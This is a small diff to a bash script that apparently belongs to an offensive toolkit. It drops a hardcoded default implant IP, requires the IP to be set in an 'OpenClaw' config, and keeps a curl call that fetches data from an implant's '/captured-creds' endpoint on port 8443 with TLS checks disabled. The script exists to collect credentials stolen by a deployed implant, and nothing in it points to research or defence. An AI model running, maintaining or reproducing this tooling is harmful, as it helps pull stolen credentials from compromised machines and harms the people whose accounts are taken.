@@ -8,7 +8,11 @@
 
 set -euo pipefail
 
-IMPLANT_IP="${1:-${IMPLANT_IPS:-10.8.0.3}}"
+IMPLANT_IP="${1:-${IMPLANT_IPS:-}}"
+if [ -z "$IMPLANT_IP" ]; then
+    echo '{"error":"No implant IP provided. Set implant_ips in OpenClaw config."}'
+    exit 1
+fi
 PORT="${2:-8443}"
 
 RESPONSE=$(curl -sk --max-time 10 "https://${IMPLANT_IP}:${PORT}/captured-creds" 2>/dev/null || echo "")
